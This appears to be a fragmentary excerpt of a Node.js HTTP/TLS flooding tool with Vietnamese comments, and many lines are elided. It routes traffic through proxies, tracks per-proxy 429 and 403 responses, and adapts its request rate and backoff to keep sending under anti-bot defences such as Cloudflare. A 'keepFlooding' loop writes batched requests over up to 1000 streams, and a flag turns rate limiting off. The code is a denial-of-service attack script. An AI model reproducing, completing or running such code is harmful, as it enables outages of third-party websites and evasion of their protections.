...
let noRateLimit = process.argv.includes('--no-rate-limit');
let cfray = {};
let iii = {};
let cachecontrol = {};
...
// ============ RATE LIMIT TRACKING ============
const proxyStats = {};
const RATE_LIMIT_CLEANUP_INTERVAL = 300000; // 5 phút
...
function trackSuccess(proxyKey) {
    ...
    proxyStats[proxyKey].totalAttempts++;
    proxyStats[proxyKey].lastSuccess = Date.now();
    proxyStats[proxyKey].consecutiveFailures = 0;
}
...
function handle429(proxyKey) {
    ...
    proxyStats[proxyKey].rateLimit++;
    proxyStats[proxyKey].consecutiveFailures++;
    
    // Exponential backoff: 2^n * 1000ms, max 60s
    const backoffTime = Math.min(60000, 1000 * Math.pow(2, Math.min(proxyStats[proxyKey].rateLimit, 6)));
    proxyStats[proxyKey].blockedUntil = Date.now() + backoffTime;
    proxyStats[proxyKey].successCount = 0;
    
    if (debugMode) {
        console.log(`[${proxyKey}] 429 (attempt ${proxyStats[proxyKey].rateLimit}) - backoff ${backoffTime}ms`);
    }
}

function getRatelimitFor(proxyKey, defaultRate) {
    if (!proxyStats[proxyKey]) return parseInt(defaultRate);
    
    // Nếu noRateLimit flag được bật, bỏ qua rate limit
    if (noRateLimit) return parseInt(defaultRate);
    
    // Nếu proxy đang bị block, trả về 0 (không gửi request)
    if (proxyStats[proxyKey].blockedUntil && Date.now() < proxyStats[proxyKey].blockedUntil) {
        return 0;
    }
    
    // Reset blockedUntil nếu đã qua thời gian
    if (proxyStats[proxyKey].blockedUntil && Date.now() >= proxyStats[proxyKey].blockedUntil) {
        proxyStats[proxyKey].blockedUntil = null;
        if (proxyStats[proxyKey].rateLimit > 5) {
            // Giảm dần rateLimit nếu đã hết block
            proxyStats[proxyKey].rateLimit = Math.max(0, proxyStats[proxyKey].rateLimit - 2);
        }
    }
    
    // Nếu tỷ lệ thành công thấp, giảm tốc độ
    const total = proxyStats[proxyKey].successCount + proxyStats[proxyKey].rateLimit + proxyStats[proxyKey].consecutiveFailures;
    if (total > 10) {
        const successRate = proxyStats[proxyKey].successCount / total;
        if (successRate < 0.2) {
            return Math.max(1, Math.floor(parseInt(defaultRate) * 0.2));
        }
        if (successRate < 0.4) {
            return Math.max(1, Math.floor(parseInt(defaultRate) * 0.4));
        }
        if (successRate < 0.6) {
            return Math.max(1, Math.floor(parseInt(defaultRate) * 0.6));
        }
    }
    
    // Dynamic rate limit based on history
    const baseRate = parseInt(defaultRate);
    const rateLimitFactor = proxyStats[proxyKey].rateLimit > 0 ? 
        Math.max(0.5, 1 - (proxyStats[proxyKey].rateLimit / (proxyStats[proxyKey].successCount + 1))) : 1;
    
    return Math.max(1, Math.floor(baseRate * rateLimitFactor));
}

// Cleanup proxy stats mỗi 5 phút
setInterval(() => {
    const now = Date.now();
    for (const [key, stats] of Object.entries(proxyStats)) {
        // Reset rate limit nếu đã qua 5 phút và không có 429 mới
        if (stats.blockedUntil && now > stats.blockedUntil + 60000) {
            stats.rateLimit = Math.max(0, stats.rateLimit - 2);
            if (stats.rateLimit === 0) {
                stats.blockedUntil = null;
            }
        }
        // Reset counter nếu không hoạt động trong 5 phút
        if (now - stats.lastSuccess > 300000) {
...
function go() {
    ...
    // ===== RATE LIMIT CHECK =====
    const currentRate = getRatelimitFor(proxyKey, parseInt(ratelimit));
    
    if (currentRate === 0 && !noRateLimit) {
        // Proxy đang bị block, đợi và thử lại
        const blockedUntil = proxyStats[proxyKey]?.blockedUntil || Date.now() + 5000;
        const waitTime = blockedUntil - Date.now() + 1000;
        if (debugMode) console.log(`[${proxyKey}] Waiting ${Math.max(1000, waitTime)}ms due to rate limit`);
        setTimeout(() => go(), Math.max(1000, waitTime));
        return;
    }
    // =================================
        ...
        netSocket.once('data', (data) => {
            ...
            const tlsSocket = tls.connect({
                    ...
                    function main() {
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main();
                                }, isFull ? 1000 : 1000 / getRatelimitFor(proxyKey, parseInt(ratelimit)));
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                            ...
                            if (frame.type == 1) {
                                ...
                                if (status == "403" || status == "401") {
                                    ...
                                    if (retryAfter) {
                                        ...
                                        if (debugMode) console.log(`[${proxyKey}] Retry-After: ${retryAfter}s | cf-cache-status: ${cachecontrol} | ${iii} ${cfray}`);
                                        setTimeout(() => {
                                            tlsSocket.end(() => tlsSocket.destroy());
                                            netSocket.end(() => netSocket.destroy());
                                            go();
                                        ...
                                        const backoffTime = Math.min(30000, 1000 * Math.pow(2, proxyStats[proxyKey]?.rateLimit || 1));
                                        setTimeout(() => {
                                            tlsSocket.end(() => tlsSocket.destroy());
                                            netSocket.end(() => netSocket.destroy());
                                            go();
                ...
                function main() {
                    ...
                    // Tính toán batch size dựa trên rate limit
                    const batchSize = Math.min(50, Math.max(2, Math.floor(currentRate / 2)));
                    ...
                    function keepFlooding() {
                        ...
                        tlsSocket.write(Buffer.concat(batch), (err) => {
                            if (!err && activeStreams < 1000) {
                                const delayTime = Math.max(50, Math.floor(300 / currentRate));
                                setTimeout(keepFlooding, delayTime);
                            }
                        });
                    }
                    keepFlooding();
                    ...
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        ...
                        const rate = getRatelimitFor(proxyKey, parseInt(ratelimit));
                        const delayTime = Math.max(10, Math.floor(100 / rate) + (delay || 0));
                        setTimeout(() => {
                            main();
                        }, delayTime);
                    });
